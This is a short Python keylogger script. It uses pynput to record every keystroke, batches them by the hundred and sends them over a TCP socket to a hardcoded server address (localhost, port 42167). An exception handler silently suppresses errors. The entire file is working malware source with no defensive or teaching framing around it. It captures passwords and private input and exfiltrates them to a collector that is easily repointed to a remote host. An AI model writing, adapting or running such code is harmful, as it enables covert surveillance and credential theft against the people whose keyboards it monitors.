from pynput.keyboard import Key, KeyCode, Listener
import socket

VERBOSE = True

count = 0
keys = []

# Pass try catch block to suppress all error logs
try:
    s = socket.socket()
    server_addr = '127.0.0.1'
    port = 42167
    s.connect((server_addr, port))
    SEND_SIZE = 100
    
    def encode_key(k):
        if isinstance(k, KeyCode):
            return bytes([k.vk])
        else:
            return b'<' + k.name.encode('ascii') + b'>'
    
    def on_press(key):
        global keys,count
        keys.append(key)
        count+=1
        if VERBOSE:
            print(count)
            print("{0} pressed".format(key))
    
        if count>= SEND_SIZE:
            s.send(b''.join(encode_key(key) for key in keys))
            keys.clear()
            count=0
            if VERBOSE:
                print('sent to server')
       
    def on_release(key):
        if key==Key.esc:
            return False
    
    with Listener(on_press=on_press, on_release= on_release) as listener:
        listener.join()

except Exception:
    pass

